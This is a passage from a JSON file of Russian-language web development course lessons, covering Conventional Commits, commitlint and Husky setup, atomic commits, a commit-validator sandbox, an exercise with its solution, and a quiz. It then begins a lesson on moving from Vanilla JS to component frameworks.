          "content": "В стандарте Conventional Commits каждому типу отведена строго определённая роль:\n\n| Тип коммита | Когда использовать | Влияние на SemVer |\n|:---|:---|:---:|\n| `feat` | Добавление нового функционала для пользователя | `MINOR` (1.1.0 -> 1.2.0) |\n| `fix` | Исправление бага в существующей функциональности | `PATCH` (1.1.0 -> 1.1.1) |\n| `refactor` | Изменение кода без изменения поведения и без багфиксов | Нет (или PATCH) |\n| `perf` | Оптимизация производительности (скорость рендера, память) | `PATCH` |\n| `docs` | Изменения только в документации (JSDoc, README, Swagger) | Нет |\n| `style` | Форматирование, пробелы, точки с запятой (без изменения AST) | Нет |\n| `test` | Добавление или корректировка тестов (Jest, Vitest, Playwright) | Нет |\n| `build` | Изменения в сборщике (Vite, Rollup) или npm-зависимостях | `PATCH` |\n| `ci` | Настройки пайплайнов (GitHub Actions, Dockerfile, scripts) | Нет |\n| `chore` | Рутинные задачи (обновление `.gitignore`, лицензий, утилит) | Нет |\n| `revert` | Откат предыдущего коммита с указанием его SHA-хеша | Зависит от отката |",
          "codeExample": {
            "language": "bash",
            "title": "ПРИМЕРЫ ПРАВИЛЬНЫХ КОММИТОВ ДЛЯ РАЗНЫХ ТИПОВ",
            "code": "# 1. Новая фича с областью (scope)\nfeat(auth): implement Google one-tap sign-in\n\n# 2. Багфикс\nfix(cart): prevent negative item counter on fast clicks\n\n# 3. Рефакторинг без изменения функционала\nrefactor(table): extract pagination logic into usePagination hook\n\n# 4. Оптимизация производительности\nperf(feed): virtualize infinite scroll list with tanstack-virtual\n\n# 5. Сборка и зависимости\nbuild(deps): upgrade vite from 5.4.0 to 6.0.0"
          }
        },
        {
          "title": "Ломающие изменения (Breaking Changes) и связь с тикетами",
          "content": "Когда коммит ломает обратную совместимость (удаление устаревшего метода API, изменение контракта пропсов, смена структуры ответа), об этом необходимо явно сообщить:\n\n1. **Восклицательный знак `!` после типа/скоупа**:\n   `feat(api)!: switch authentication header from Bearer to Token`\n2. **Блок `BREAKING CHANGE:` в футере коммита**:\n   В теле или подвале коммита добавляется подробная инструкция по миграции:\n   ```\n   BREAKING CHANGE: The 'userId' parameter has been removed from getUserProfile().\n   Use auth.currentUser.id instead.\n   ```\n\n### Интеграция с Jira / GitHub / GitLab Issues:\nВ футере коммита указываются ключевые слова, автоматически переводящие статус задачи при мерже:\n- `Closes #123` / `Fixes #123` — автоматически закрывает задачу #123.\n- `Refs #456` / `Relates to #456` — привязывает коммит к задаче без её закрытия.",
          "codeExample": {
            "language": "bash",
            "title": "КОММИТ С BREAKING CHANGE И СВЯЗЬЮ С ТАСК-ТРЕКЕРОМ",
            "code": "refactor(http-client)!: migrate from axios to native fetch API\n\nRemove axios dependency to reduce client bundle size by 14 KB.\nStandardize request interceptors using Fetch API Request/Response wrappers.\n\nBREAKING CHANGE: custom axios config options (e.g. `transformRequest`)\nare no longer supported in apiService. Use standard RequestInit options.\n\nCloses PROJ-1420\nRefs PROJ-1105"
          }
        },
        {
          "title": "Автоматизация контроля: Настройка Husky и commitlint",
          "content": "Полагаться только на сознательность разработчиков нельзя. В профессиональных проектах коммиты проверяются автоматически перед фиксацией с помощью **Git Hooks**:\n\n1. **Husky**: менеджер локальных Git Hooks в Node.js-проектах.\n2. **commitlint**: линтер, проверяющий текст сообщения на соответствие `@commitlint/config-conventional`.\n\nЕсли разработчик напишет `git commit -m \"fix bug\"`, хук `commit-msg` перехватит выполнение, выведет понятную ошибку с подсказкой и **заблокирует создание коммита** до исправления.",
          "image": {
            "src": "/images/lessons/git-commitlint-husky-flow.svg",
            "alt": "Пайплайн валидации коммитов через Husky и Commitlint",
            "caption": "Схема 2: Валидация коммит-сообщений через Husky hook и авто-релиз"
          },
          "codeExample": {
            "language": "json",
            "title": "КОНФИГУРАЦИЯ .commitlintrc.json",
            "code": "{\n  \"extends\": [\"@commitlint/config-conventional\"],\n  \"rules\": {\n    \"type-enum\": [\n      2,\n      \"always\",\n      [\n        \"feat\", \"fix\", \"docs\", \"style\", \"refactor\",\n        \"perf\", \"test\", \"build\", \"ci\", \"chore\", \"revert\"\n      ]\n    ],\n    \"subject-case\": [2, \"never\", [\"sentence-case\", \"start-case\", \"pascal-case\", \"upper-case\"]],\n    \"subject-empty\": [2, \"never\"],\n    \"subject-full-stop\": [2, \"never\", \".\"],\n    \"header-max-length\": [2, \"always\", 72]\n  }\n}"
          }
        },
        {
          "title": "Атомарность коммитов и полезные команды (git add -p, amend)",
          "content": "Принцип **атомарного коммита (Atomic Commit)** гласит: *один коммит должен решать ровно одну логическую задачу*. Если вы исправили баг и попутно отрефакторили 5 соседних файлов — разделите это на 2 разных коммита!\n\n### Инструменты опытного разработчика:\n- `git add -p` (**patch mode**): позволяет интерактивно просматривать каждый изменённый блок кода (`hunk`) и добавлять в индекс только нужные строчки, разделяя несвязанные изменения.\n- `git commit --amend`: позволяет дополнить последний коммит забытыми файлами или исправить опечатку в сообщении без создания лишнего коммита `fix typo`.\n- `git commit --amend --no-edit`: быстрое добавление изменений в последний коммит без открытия редактора сообщений (только до пуша в origin!).",
          "codeExample": {
            "language": "bash",
            "title": "ПОЛЕЗНЫЕ КОМАНДЫ ДЛЯ ЧИСТОЙ ИСТОРИИ",
            "code": "# 1. Интерактивный выбор строк для атомарного коммита\ngit add -p src/components/Header.tsx\n\n# 2. Исправление последнего локального коммита\ngit add src/utils/format.ts\ngit commit --amend --no-edit\n\n# 3. Проверка истории в красивом однострочном графе\ngit log --graph --oneline --decorate -n 10"
          }
        }
      ],
      "commonMistakes": [
        {
          "bad": "git commit -m \"fix bug\"",
          "good": "git commit -m \"fix(auth): resolve token refresh loop on expired session\"",
          "reason": "Сообщение 'fix bug' не даёт никакой информации о том, где и какой именно баг был исправлен. В Conventional Commits обязательно указывать скоуп и конкретное описание проблемы."
        },
        {
          "bad": "git commit -m \"Added user profile avatar upload, fixed CSS padding in navbar and updated dependencies\"",
          "good": "Разбить на 3 отдельных коммита:\n1. feat(profile): add avatar image upload functionality\n2. fix(navbar): adjust mobile horizontal padding\n3. chore(deps): bump typescript from 5.4 to 5.5",
          "reason": "Нарушение принципа атомарности. Если один из функционалов вызовет сбой, его невозможно будет безопасно откатить через git revert, не затронув остальные несвязанные изменения."
        },
        {
          "bad": "git commit -m \"feat(cart): Added new discount calculator.\"",
          "good": "git commit -m \"feat(cart): add new discount calculator\"",
          "reason": "Заголовок должен быть в императивном залоге (add вместо added) и без точки в конце (экономит лимит символов)."
        },
        {
          "bad": "git commit -m \"WIP (work in progress)\"",
          "good": "git commit -m \"feat(checkout): scaffold delivery address selection form\"",
          "reason": "WIP-коммиты засоряют историю ветки. Используйте git stash для временного сохранения или оформляйте логически завершённый шаг работы."
        }
      ],
      "seniorTips": [
        "Всегда пишите subject на английском языке в нижнем регистре без точки в конце: 'feat(search): add debounced query input'. Это международный стандарт в любой IT-компании.",
        "Используйте 'git commit --amend' только для локальных коммитов, которые ещё не были запушены в общий репозиторий. Никогда не делайте force-push в main / develop.",
        "Тело коммита (Body) должно отвечать на вопросы 'ПОЧЕМУ' и 'ЧТО' изменилось, а не дублировать диф кода (диф уже отвечает на вопрос 'КАК').",
        "Настройте утилиту 'commitizen' (команда 'git cz'), если команде сложно держать в голове все типы коммитов — интерактивный CLI задаст нужные вопросы и сформирует идеальное сообщение.",
        "Всегда проверяйте 'git log -n 5' перед созданием Pull Request, чтобы убедиться в чистоте и логичности сформированной цепочки коммитов."
      ],
      "keyTakeaways": [
        "Стандарты Conventional Commits и Airbnb структурируют историю проекта в строгом формате: '<type>(<scope>): <subject>'.",
        "Тема коммита (Subject) пишется в императивном наклонении настоящего времени, начинается со строчной буквы и не превышает 50 символов.",
        "Тело коммита (Body) отделяется пустой строкой и форматируется с переносом строк на 72 символах (правило 50/72).",
        "Ломающие изменения (Breaking Changes) обозначаются символом '!' после скоупа или ключевым блоком 'BREAKING CHANGE:' в футере коммита.",
        "Автоматическая валидация через Husky ('commit-msg') и commitlint гарантирует чистоту репозитория, позволяя автоматически генерировать CHANGELOG.md и бампать версии по SemVer."
      ]
    },
    "sandbox": {
      "instructions": "Интерактивный валидатор и генератор коммитов по стандарту Airbnb & Conventional Commits. Выберите тип, укажите Scope, введите Subject и проверьте соблюдение правила 50/72, регистра и императивного залога в реальном времени!",
      "initialHtml": "<div class=\"commit-tool\">\n  <h2>Генератор & Валидатор коммитов Airbnb</h2>\n  \n  <div class=\"form-group\">\n    <label>Тип коммита (Type):</label>\n    <select id=\"commit-type\">\n      <option value=\"feat\">feat (Новая фича / Minor bump)</option>\n      <option value=\"fix\">fix (Исправление бага / Patch bump)</option>\n      <option value=\"refactor\">refactor (Рефакторинг без смены логики)</option>\n      <option value=\"perf\">perf (Оптимизация производительности)</option>\n      <option value=\"docs\">docs (Документация)</option>\n      <option value=\"style\">style (Форматирование)</option>\n      <option value=\"test\">test (Тесты)</option>\n      <option value=\"build\">build (Сборка / Зависимости)</option>\n      <option value=\"ci\">ci (CI/CD конфигурация)</option>\n      <option value=\"chore\">chore (Рутинные задачи)</option>\n    </select>\n  </div>\n\n  <div class=\"form-row\">\n    <div class=\"form-group flex-1\">\n      <label>Область (Scope, опционально):</label>\n      <input type=\"text\" id=\"commit-scope\" placeholder=\"auth, cart, profile...\" value=\"auth\" />\n    </div>\n    <div class=\"form-group flex-checkbox\">\n      <label><input type=\"checkbox\" id=\"commit-breaking\" /> Breaking Change (!)</label>\n    </div>\n  </div>\n\n  <div class=\"form-group\">\n    <div class=\"label-with-counter\">\n      <label>Тема (Subject — императивный залог, lowercase, без точки):</label>\n      <span id=\"subject-counter\" class=\"counter\">0 / 50</span>\n    </div>\n    <input type=\"text\" id=\"commit-subject\" placeholder=\"add Google OAuth2 social login support\" value=\"add Google OAuth2 social login support\" />\n  </div>\n\n  <div class=\"form-group\">\n    <label>Тело (Body — описание деталей и причин, перенос 72 симв.):</label>\n    <textarea id=\"commit-body\" rows=\"3\" placeholder=\"Integrate Supabase OAuth provider flow.\nStore refresh tokens in secure HTTP-only cookies.\"></textarea>\n  </div>\n\n  <div class=\"form-group\">\n    <label>Футер / Issue Tracker (Footer, опционально):</label>\n    <input type=\"text\" id=\"commit-footer\" placeholder=\"Closes #142, Refs #89\" value=\"Closes #142\" />\n  </div>\n\n  <div class=\"validation-box\" id=\"validation-box\">\n    <h4>Статус валидации Conventional Commits:</h4>\n    <ul id=\"validation-list\"></ul>\n  </div>\n\n  <div class=\"preview-box\">\n    <h4>Итоговое сообщение коммита:</h4>\n    <pre id=\"commit-preview\"></pre>\n    <button id=\"btn-copy\" class=\"btn-copy\">Копировать команду git commit</button>\n  </div>\n</div>",
      "initialCss": "* { box-sizing: border-box; }\nbody {\n  background: #0d1117;\n  color: #c9d1d9;\n  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;\n  padding: 16px;\n  margin: 0;\n}\n.commit-tool {\n  max-width: 680px;\n  margin: 0 auto;\n  background: #161b22;\n  border: 1px solid #30363d;\n  border-radius: 8px;\n  padding: 20px;\n}\nh2 { margin-top: 0; color: #58a6ff; font-size: 18px; border-bottom: 1px solid #21262d; padding-bottom: 10px; }\nh4 { margin: 0 0 8px 0; font-size: 14px; }\n.form-group { margin-bottom: 14px; }\n.form-row { display: flex; gap: 12px; align-items: flex-end; }\n.flex-1 { flex: 1; }\n.flex-checkbox { padding-bottom: 10px; }\n.flex-checkbox label { display: flex; align-items: center; gap: 6px; cursor: pointer; color: #f85149; font-weight: bold; }\nlabel { display: block; margin-bottom: 5px; font-size: 12.5px; color: #8b949e; font-weight: 500; }\n.label-with-counter { display: flex; justify-content: space-between; align-items: center; }\n.counter { font-size: 11px; font-family: monospace; color: #3fb950; font-weight: bold; }\n.counter.warn { color: #d29922; }\n.counter.err { color: #f85149; }\ninput[type=\"text\"], select, textarea {\n  width: 100%;\n  background: #0d1117;\n  border: 1px solid #30363d;\n  border-radius: 6px;\n  color: #f0f6fc;\n  padding: 8px 12px;\n  font-size: 13px;\n  font-family: monospace;\n}\ninput[type=\"text\"]:focus, select:focus, textarea:focus {\n  outline: none;\n  border-color: #58a6ff;\n  box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.2);\n}\n.validation-box {\n  background: #0d1117;\n  border: 1px solid #30363d;\n  border-radius: 6px;\n  padding: 12px;\n  margin-top: 16px;\n}\n.validation-box ul { margin: 0; padding-left: 20px; font-size: 12px; }\n.val-pass { color: #3fb950; margin-bottom: 4px; }\n.val-fail { color: #f85149; margin-bottom: 4px; }\n.preview-box {\n  margin-top: 16px;\n  background: #090d13;\n  border: 1px solid #238636;\n  border-radius: 6px;\n  padding: 14px;\n}\npre {\n  background: #040d1a;\n  color: #7ee787;\n  padding: 10px;\n  border-radius: 4px;\n  font-size: 12.5px;\n  line-height: 1.45;\n  white-space: pre-wrap;\n  margin: 0 0 10px 0;\n  border: 1px solid #1f3a5f;\n}\n.btn-copy {\n  background: #238636;\n  color: #fff;\n  border: none;\n  padding: 8px 16px;\n  border-radius: 6px;\n  font-weight: 600;\n  font-size: 12.5px;\n  cursor: pointer;\n  transition: 0.15s ease;\n}\n.btn-copy:hover { background: #2ea043; }",
      "initialJs": "const typeEl = document.getElementById('commit-type');\nconst scopeEl = document.getElementById('commit-scope');\nconst breakingEl = document.getElementById('commit-breaking');\nconst subjectEl = document.getElementById('commit-subject');\nconst bodyEl = document.getElementById('commit-body');\nconst footerEl = document.getElementById('commit-footer');\nconst counterEl = document.getElementById('subject-counter');\nconst previewEl = document.getElementById('commit-preview');\nconst valListEl = document.getElementById('validation-list');\nconst copyBtn = document.getElementById('btn-copy');\n\nfunction updateCommit() {\n  const type = typeEl.value;\n  const scope = scopeEl.value.trim();\n  const isBreaking = breakingEl.checked;\n  const subject = subjectEl.value.trim();\n  const body = bodyEl.value.trim();\n  const footer = footerEl.value.trim();\n\n  // Header construction\n  let header = type;\n  if (scope) header += `(${scope})`;\n  if (isBreaking) header += '!';\n  header += ': ' + subject;\n\n  // Full message\n  let fullMsg = header;\n  if (body) fullMsg += '\\n\\n' + body;\n  if (isBreaking && !body.includes('BREAKING CHANGE:')) {\n    fullMsg += '\\n\\nBREAKING CHANGE: ' + (subject || 'Major architectural update');\n  }\n  if (footer) fullMsg += '\\n\\n' + footer;\n\n  previewEl.textContent = fullMsg;\n\n  // Subject Counter & Validation\n  const subjLen = subject.length;\n  counterEl.textContent = `${subjLen} / 50`;\n  counterEl.className = 'counter' + (subjLen > 72 ? ' err' : subjLen > 50 ? ' warn' : '');\n\n  // Rules validation list\n  const checks = [];\n  \n  // Rule 1: Subject length <= 50 (max 72)\n  if (subjLen > 0 && subjLen <= 50) {\n    checks.push({ ok: true, text: `✓ Длина заголовка в идеале (<= 50 символов: ${subjLen})` });\n  } else if (subjLen <= 72 && subjLen > 0) {\n    checks.push({ ok: true, text: `⚠ Длина заголовка допустима, но превышает 50 символов (${subjLen}/72)` });\n  } else {\n    checks.push({ ok: false, text: `✖ Длина заголовка превышает лимит 72 символа (${subjLen})` });\n  }\n\n  // Rule 2: Lowercase subject\n  if (subject && subject[0] === subject[0].toLowerCase() && subject[0] !== subject[0].toUpperCase()) {\n    checks.push({ ok: true, text: '✓ Тема начинается со строчной буквы (lowercase)' });\n  } else if (subject) {\n    checks.push({ ok: false, text: '✖ Тема должна начинаться со строчной буквы (не с Заглавной)' });\n  }\n\n  // Rule 3: No full stop at the end\n  if (subject.endsWith('.')) {\n    checks.push({ ok: false, text: '✖ В конце заголовка не должно быть точки \".\"' });\n  } else {\n    checks.push({ ok: true, text: '✓ В конце заголовка нет точки' });\n  }\n\n  // Rule 4: Imperative mood check (added -> add, fixed -> fix)\n  const nonImperative = ['added', 'fixed', 'fixing', 'updates', 'updated', 'updating', 'removed', 'removing', 'changed', 'changing'];\n  const firstWord = subject.split(' ')[0].toLowerCase();\n  if (nonImperative.includes(firstWord)) {\n    checks.push({ ok: false, text: `✖ Используйте императивный залог: замените \"${firstWord}\" на правильную форму глагола` });\n  } else if (subject) {\n    checks.push({ ok: true, text: '✓ Используется императивный залог настоящего времени (add, fix, refactor)' });\n  }\n\n  // Render checks\n  valListEl.innerHTML = checks.map(c => `<li class=\"${c.ok ? 'val-pass' : 'val-fail'}\">${c.text}</li>`).join('');\n}\n\n[typeEl, scopeEl, breakingEl, subjectEl, bodyEl, footerEl].forEach(el => {\n  el.addEventListener('input', updateCommit);\n  el.addEventListener('change', updateCommit);\n});\n\ncopyBtn.addEventListener('click', () => {\n  const msg = previewEl.textContent;\n  const cmd = `git commit -m \"${msg.replace(/\"/g, '\\\\\"')}\"`;\n  navigator.clipboard.writeText(cmd);\n  copyBtn.textContent = 'Скопировано в буфер!';\n  setTimeout(() => copyBtn.textContent = 'Копировать команду git commit', 2000);\n});\n\nupdateCommit();"
    },
    "task": {
      "title": "Настройка Commitlint и цепочка атомарных коммитов по стандарту Airbnb",
      "scenario": "Вы разрабатываете модуль двухфакторной аутентификации (2FA) для финтех-платформы. Вам необходимо подготовить файл конфигурации `.commitlintrc.json` и составить последовательность из 3 идеальных атомарных коммитов для Pull Request, включая Breaking Change.",
      "criteria": [
        "Файл .commitlintrc.json расширяет @commitlint/config-conventional и задает типы: feat, fix, docs, style, refactor, perf, test, build, ci, chore, revert",
        "Задано правило subject-case: запрет sentence-case, start-case, pascal-case, upper-case (уровень 2 - error)",
        "Сформирована цепочка из 3 правильных коммитов в императивном залоге (feat, test, refactor!)",
        "Оформлен коммит с Breaking Change через восклицательный знак '!' и блок 'BREAKING CHANGE:' в футере",
        "Присутствует связь с тикетом в футере ('Closes #312')"
      ],
      "starterCode": {
        "js": "// 1. Конфигурация .commitlintrc.json (исправьте и дополните правила)\nconst commitlintConfig = {\n  extends: ['@commitlint/config-conventional'],\n  rules: {\n    // Настройте список допустимых типов (type-enum)\n    'type-enum': [2, 'always', []],\n    // Запретите заглавные буквы в subject\n    'subject-case': [2, 'never', []],\n    // Запретите точку в конце заголовка\n    'subject-full-stop': [2, 'never', '.']\n  }\n};\n\n// 2. Цепочка из 3 коммитов для ветки feature/2fa-auth\nconst gitCommitLog = [\n  // Коммит 1: Добавление сервиса генерации TOTP токенов\n  '???',\n\n  // Коммит 2: Добавление Unit-тестов для TOTP валидатора\n  '???',\n\n  // Коммит 3: Ломающее изменение в сигнатуре метода authService.verify()\n  '???'\n];"
      },
      "hints": [
        "В type-enum перечислите все стандартные типы: feat, fix, docs, style, refactor, perf, test, build, ci, chore, revert.",
        "В subject-case в массив 'never' передайте ['sentence-case', 'start-case', 'pascal-case', 'upper-case'].",
        "Для Breaking Change используйте структуру: refactor(auth)!: ... с блоком BREAKING CHANGE: в футере и Closes #312."
      ],
      "solution": {
        "js": "// 1. Эталонная конфигурация .commitlintrc.json\nconst commitlintConfig = {\n  extends: ['@commitlint/config-conventional'],\n  rules: {\n    'type-enum': [\n      2,\n      'always',\n      [\n        'feat', 'fix', 'docs', 'style', 'refactor',\n        'perf', 'test', 'build', 'ci', 'chore', 'revert'\n      ]\n    ],\n    'subject-case': [\n      2,\n      'never',\n      ['sentence-case', 'start-case', 'pascal-case', 'upper-case']\n    ],\n    'subject-full-stop': [2, 'never', '.'],\n    'header-max-length': [2, 'always', 72]\n  }\n};\n\n// 2. Эталонная цепочка атомарных коммитов\nconst gitCommitLog = [\n  // Коммит 1: Новая фича с указанием скоупа\n  'feat(auth): add TOTP two-factor authentication generator',\n\n  // Коммит 2: Unit-тесты для нового функционала\n  'test(auth): add unit test suite for TOTP code validation',\n\n  // Коммит 3: Breaking Change с миграцией и закрытием задачи в Jira\n  `refactor(auth)!: require mandatory 2FA token in verifySession\\n\\nBREAKING CHANGE: verifySession() now requires 6-digit TOTP token in payload.\\nLegacy single-factor payload will be rejected with HTTP 401.\\n\\nCloses #312`\n];",
        "explanation": "Конфигурация commitlint строго форсирует правила Conventional Commits: тип из белого списка, lowercase в заголовке, отсутствие точки и максимальную длину заголовка 72 символа. Цепочка коммитов разделена на три атомарных шага: реализация фичи -> тестирование -> ломающее обновление с подробным описанием миграции в BREAKING CHANGE."
      }
    },
    "quiz": {
      "questions": [
        {
          "id": "pro-22-q1",
          "question": "Какое из сообщений коммита оформлено строго по стандарту Conventional Commits и гайду Airbnb?",
          "options": [
            "`feat(auth): Added support for OAuth2 authentication.`",
            "`Feature(Auth): Add oauth2 authentication support!`",
            "`feat(auth): add OAuth2 authentication support`",
            "`feat(auth): adding OAuth2 authentication support`"
          ],
          "correctIndex": 2,
          "explanation": "Правильная форма собирает сразу несколько требований: тип строчными буквами из фиксированного списка, область в скобках, описание в повелительном наклонении настоящего времени и без точки в конце. Остальные варианты нарушают по одному правилу каждый: прошедшее время и точка, неверный тип с заглавными буквами, причастная форма вместо повелительной."
        },
        {
          "id": "pro-22-q2",
          "question": "Разработчик ускорил отрисовку каталога втрое, не изменив ни функциональность, ни внешний вид. Какой тип коммита верен?",
          "options": [
            "`fix` — устранена проблема с медленной работой интерфейса приложения",
            "`perf` — изменение направлено именно на улучшение производительности",
            "`refactor` — изменена внутренняя реализация без изменения внешнего поведения",
            "`chore` — правка не затрагивает поведение, заметное конечному пользователю"
          ],
          "correctIndex": 1,
          "explanation": "Для ускорения работы в таксономии есть отдельный тип, и он же влияет на автоматическое повышение версии наравне с новой функциональностью. Тип для рефакторинга подошёл бы, если бы менялась только читаемость кода без выигрыша в скорости. Исправление ошибки предполагает, что что-то работало неправильно, а служебный тип применяют к настройкам сборки и зависимостям."
        },
        {
          "id": "pro-22-q3",
          "question": "Как пометить ломающее изменение, чтобы автоматика подняла мажорную версию?",
          "options": [
            "Типом `major` вместо обычного типа изменения в заголовке коммита",
            "Словом `BREAKING` в начале заголовка, набранным заглавными буквами",
            "Восклицательным знаком перед двоеточием либо блоком `BREAKING CHANGE:` в подвале",
            "Меткой в квадратных скобках, добавленной в конец строки заголовка"
          ],
          "correctIndex": 2,
          "explanation": "Стандарт допускает две равноправные формы: краткий знак сразу после типа или области, например `feat(api)!:`, и развёрнутый блок в подвале сообщения, где можно объяснить, что именно сломалось и как мигрировать. Инструменты автоматического выпуска ищут ровно эти две конструкции: увидев любую из них, они повышают первое число версии и выносят пункт в отдельный раздел списка изменений."
        },
        {
          "id": "pro-22-q4",
          "question": "Что предписывает классическое правило 50/72 для оформления коммитов?",
          "options": [
            "Не более 50 коммитов в одной ветке и не более 72 строк кода в одном файле",
            "Заголовок не длиннее 50 символов, а строки описания переносятся по 72 символа",
            "Коммит делается не дольше 50 минут, а его ревью занимает не более 72 минут",
            "Минимум 50 тестов в проекте при покрытии кода не ниже 72 процентов"
          ],
          "correctIndex": 1,
          "explanation": "Числа взяты не с потолка: краткий журнал истории и интерфейсы хостингов обрезают заголовок примерно на пятидесяти символах, а перенос описания по семидесяти двум оставляет место под отступ в четыре пробела, которым история отображается в терминале шириной восемьдесят. Ограничение заодно дисциплинирует: не помещаетесь в заголовок — скорее всего, коммит следовало разбить на несколько."
        },
        {
          "id": "pro-22-q5",
          "question": "На каком хуке Git проверяют текст сообщения коммита средствами commitlint?",
          "options": [
            "`commit-msg` — он получает на вход файл с текстом сообщения",
            "`pre-commit` — он запускается перед созданием коммита",
            "`pre-push` — проверка выполняется перед отправкой в удалённый репозиторий",
            "`post-merge` — хук срабатывает уже после слияния веток"
          ],
          "correctIndex": 0,
          "explanation": "Нужный хук вызывается после того, как сообщение написано, и получает путь к файлу с его текстом — это единственный момент, когда сообщение уже есть, а коммит ещё не создан. Соседний хук, срабатывающий раньше, сообщения ещё не видит, поэтому на нём запускают линтер и форматирование изменённых файлов. Проверка перед отправкой обычно берёт на себя тесты."
        }
      ]
    }
  },
  {
    "id": "pro-23",
    "moduleId": "pro",
    "level": 23,
    "title": "От Vanilla JS к фреймворкам: React, Vue, Angular и современная компонентная разработка",
    "subtitle": "Императивный vs Декларативный подход, Virtual DOM, Proxy Reactivity, Signals, JSX, SFC, компонентное мышление и выбор стека",
    "description": "Фундаментальное руководство по переходу от Vanilla JavaScript к современной компонентной разработке. Почему индустрия ушла от прямых DOM-манипуляций к декларативным фреймворкам, как работает реактивность в React (Virtual DOM), Vue 3 (Proxy), Angular (Signals) и Svelte (компилятор), и как выбрать правильный стек для вашего проекта.",
    "estimatedMinutes": 55,
    "difficulty": "advanced",
    "tags": [
      "React",
      "Vue",
      "Angular",
      "Svelte",
      "Virtual DOM",
      "Reactivity",
      "JSX",
      "Components",
      "SPA",
      "Framework"
    ],
    "theory": {
      "overview": "Каждый Junior-разработчик, освоивший Vanilla JavaScript, рано или поздно сталкивается с ключевым вопросом: *почему все реальные продукты строятся на React, Vue или Angular, а не на чистом JS?*\n\nОтвет кроется в фундаментальном ограничении императивного подхода: при росте сложности UI (десятки динамических списков, формы, модальные окна, синхронизация с сервером) ручное управление DOM через `querySelector`, `addEventListener` и `innerHTML` приводит к неуправляемому «спагетти-коду», где состояние приложения (данные) и его визуальное представление (DOM) критически рассинхронизируются.\n\nСовременные фреймворки решают эту проблему единой формулой: **`UI = f(State)`** — интерфейс является чистой функцией от состояния. Разработчик декларирует *ЧТО* отображать при определённом состоянии, а фреймворк сам оптимально обновляет DOM. Это и есть парадигмальный переход, который вам предстоит совершить.",
      "sections": [
        {
          "title": "Проблема Vanilla JS при масштабировании: почему фреймворки стали необходимостью",
          "content": "Рассмотрим типичный сценарий: вы разрабатываете страницу интернет-магазина с каталогом товаров, фильтрацией, корзиной и чекаутом. На Vanilla JS это означает:\n\n1. **Ручной поиск элементов**: десятки вызовов `document.querySelector`, `getElementById`, `getElementsByClassName` для каждого интерактивного элемента.\n2. **Ручная привязка событий**: сотни вызовов `addEventListener` с необходимостью помнить о делегировании и утечках памяти (`removeEventListener`).\n3. **Ручная синхронизация данных и DOM**: при изменении массива товаров нужно вручную пересоздавать HTML-разметку (`innerHTML`) или управлять каждым узлом (`createElement`, `appendChild`, `removeChild`).\n4. **Проблема «спагетти-состояния» (State Spaghetti)**: состояние разбросано по десяткам глобальных переменных, замыканиям и DOM-атрибутам (`data-*`). Отследить, какая именно часть кода изменила значение `totalPrice`, становится невозможно.\n\n**Результат**: при достижении ~2000+ строк кода на Vanilla JS проект становится практически неподдерживаемым. Любое новое изменение ломает два существующих модуля, а локализация бага занимает часы вместо минут.\n\nИменно эту проблему решают React, Vue и Angular — они берут на себя синхронизацию State ↔ DOM, позволяя разработчику сфокусироваться на бизнес-логике.",
          "image": {
            "src": "/images/lessons/framework-imperative-vs-declarative.svg",
            "alt": "Сравнение императивного (Vanilla JS) и декларативного (React) подходов",
            "caption": "Схема 1: Императивный подход (Vanilla JS) описывает КАК обновить DOM шаг за шагом, а декларативный (React/Vue) описывает ЧТО должно отображаться"
          },
          "codeExample": {
            "language": "javascript",
            "title": "Та же задача на Vanilla JS и на React: счётчик корзины",
            "code": "// ── Vanilla JS: императивно. Разработчик сам синхронизирует данные и DOM ──\nlet cartCount = 0;\n\nconst badge = document.querySelector('.cart-badge');\nconst total = document.querySelector('.cart-total');\nconst empty = document.querySelector('.cart-empty');\n\ndocument.querySelector('.add-btn').addEventListener('click', () => {\n  cartCount++;\n  // Каждое место, где число видно на экране, нужно обновить руками.\n  badge.textContent = cartCount;\n  total.textContent = cartCount * 990 + ' ₽';\n  empty.hidden = cartCount > 0;\n  // Забыли одну строку — интерфейс рассинхронизировался с данными.\n});\n\n// ── React: декларативно. Описываем результат, синхронизацию берёт фреймворк ──\nfunction Cart() {\n  const [count, setCount] = useState(0);\n\n  return (\n    <>\n      <button onClick={() => setCount(count + 1)}>Добавить</button>\n      <span className=\"cart-badge\">{count}</span>\n      <span className=\"cart-total\">{count * 990} ₽</span>\n      {count === 0 && <p className=\"cart-empty\">Корзина пуста</p>}\n    </>\n  );\n}",
            "explanation": "Слева состояние живёт отдельно от разметки, и любое место вывода приходится обновлять вручную — забытая строка сразу даёт рассинхронизацию. Справа значение подставлено в разметку один раз, и все места обновляются сами при смене состояния."
          }
        },
        {
          "title": "Фундаментальная формула: UI = f(State) и декларативная парадигма",
          "content": "Все современные фреймворки объединены одной идеей — **декларативной парадигмой рендеринга**:\n\n```\nUI = f(State)\n```\n\n- **State (Состояние)**: объект, содержащий все данные приложения: `{ items: [...], user: {...}, isLoading: true }`.\n- **f (Функция-компонент)**: чистая функция (или шаблон), описывающая, как состояние трансформируется в HTML-разметку.\n- **UI (Интерфейс)**: результат рендеринга — то, что видит пользователь в браузере.\n\n### Как это работает на практике:\n1. Пользователь нажимает кнопку `«Добавить в корзину»`.\n2. Обработчик вызывает функцию обновления состояния: `setState({ cartCount: prev + 1 })` (React) или `cart.value++` (Vue).\n3. Фреймворк **автоматически** вычисляет разницу между старым и новым UI и применяет минимальный набор DOM-операций.\n4. Разработчик **НЕ** пишет ни одного `querySelector` и `textContent = ...` — фреймворк делает это за него.\n\n### Ключевой ментальный сдвиг:\n- **Vanilla JS**: *«Когда юзер кликнул → найди элемент `.counter` → обнови его `textContent`»* (пошаговый алгоритм).\n- **React/Vue**: *«Counter всегда равен `{count}` → если count изменился, UI обновится автоматически»* (декларация результата).\n\nЭтот переход от *«как сделать»* к *«что должно быть»* — самый важный ментальный сдвиг при переходе к фреймворкам.",
          "codeExample": {
            "language": "javascript",
            "title": "UI = f(State): один и тот же компонент при разных состояниях",
